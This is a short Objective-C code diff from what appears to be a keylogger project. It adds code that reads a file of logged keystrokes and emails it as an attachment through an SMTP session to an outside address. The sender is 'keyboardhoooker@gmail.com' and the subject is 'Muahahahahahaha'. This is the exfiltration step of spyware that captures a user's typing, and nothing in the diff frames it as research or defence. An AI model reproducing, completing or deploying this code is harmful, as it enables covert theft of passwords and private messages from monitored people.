@@ -20,18 +20,25 @@
     smtpSession.connectionType = MCOConnectionTypeTLS;
     
     MCOMessageBuilder *builder = [[MCOMessageBuilder alloc] init];
-    MCOAddress *from = [MCOAddress addressWithDisplayName:@"KeyboardHooker"
+    MCOAddress *from = [MCOAddress addressWithDisplayName:@"qwer"
                                                   mailbox:@"keyboardhoooker@gmail.com"];
     MCOAddress *to = [MCOAddress addressWithDisplayName:nil
                                                 mailbox:toAddress];
     [[builder header] setFrom:from];
     [[builder header] setTo:@[to]];
     [[builder header] setSubject:@"Muahahahahahaha"];
+    
+    // Добавляем файл с логом пользователя
+    MCOAttachment *att = [MCOAttachment attachmentWithData:[NSData dataWithContentsOfFile:@"/Users/ivan/Documents/keyHooks"] filename:@"attachment"];
+    [builder addAttachment:att];
+    
+    // Текст сообщения
     [builder setHTMLBody:@"I'll be back."];
     NSData * rfc822Data = [builder data];
     
     MCOSMTPSendOperation *sendOperation =
     [smtpSession sendOperationWithData:rfc822Data];
+    
     [sendOperation start:^(NSError *error) {
         if(error) {
             NSLog(@"Error sending email: %@", error);
